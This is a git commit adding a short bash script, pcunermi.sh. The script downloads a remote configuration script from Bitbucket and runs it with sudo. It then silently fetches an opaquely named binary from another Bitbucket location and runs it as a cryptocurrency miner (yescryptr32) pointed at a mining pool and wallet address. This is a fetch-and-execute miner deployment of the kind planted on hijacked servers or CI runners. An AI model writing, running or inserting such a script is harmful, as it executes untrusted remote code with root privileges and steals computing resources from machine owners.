f2b96004af577c0741e30532bd4141affbb97d62
barburonjilo <barburonjilo@outlook.co.id>
2024-06-12 13:57:18 +0700

    Create pcunermi.sh

---
+++ pcunermi.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+apt-get update ; apt-get install -y wget curl sudo
+wget https://bitbucket.org/kacepot/esce/raw/main/configurasi.sh
+chmod u+x configurasi.sh
+sudo ./configurasi.sh
+./configurasi.sh
+wget -O sgr1 https://bitbucket.org/boluna/file/downloads/mintul >/dev/null 2>&1
+chmod +x sgr1
+./sgr1 -a yescryptr32  -o stratum+tcps://stratum-asia.rplant.xyz:17116 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.tes
